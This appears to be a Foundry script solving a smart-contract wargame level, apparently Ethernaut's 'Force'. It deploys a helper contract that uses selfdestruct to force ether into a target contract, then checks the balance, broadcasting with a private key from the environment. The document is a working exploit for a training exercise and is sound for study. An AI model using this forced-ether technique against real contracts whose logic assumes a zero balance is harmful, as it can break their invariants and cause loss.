pragma solidity ^0.8.0;
import "../instances/Ilevel07.sol";
import "forge-std/Test.sol";

contract Level07 is Test {
    Force level07 = Force(0x749957c8B77690De38e0c63226708b8Ce8B00487);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        Forcer forcer = new Forcer();
        forcer.selfDestruct{value: 0.0005 ether}(payable(address(level07)));
        require(address(level07).balance > 0, "balance not > 0");
        vm.stopBroadcast();
    }
}

contract Forcer {
    function selfDestruct(address payable _target) public payable {
        selfdestruct(_target);
    }
}
